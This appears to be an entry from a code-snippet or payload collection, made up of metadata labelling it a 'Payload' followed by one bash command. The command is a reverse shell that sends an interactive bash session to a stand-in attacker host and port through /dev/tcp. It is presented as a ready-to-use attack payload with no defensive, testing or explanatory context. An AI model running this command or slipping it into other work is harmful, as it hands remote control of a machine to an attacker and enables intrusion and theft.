---
id: f6c8b9d3-6bb6-4aa3-8e65-08680c6c5036
type: code
language: Payload
verified: false
created_at: '2020-03-16T07:57:49.963943+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet f6c8b9d3

**Language**: Payload

```payload
/bin/bash -c '/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1'
```
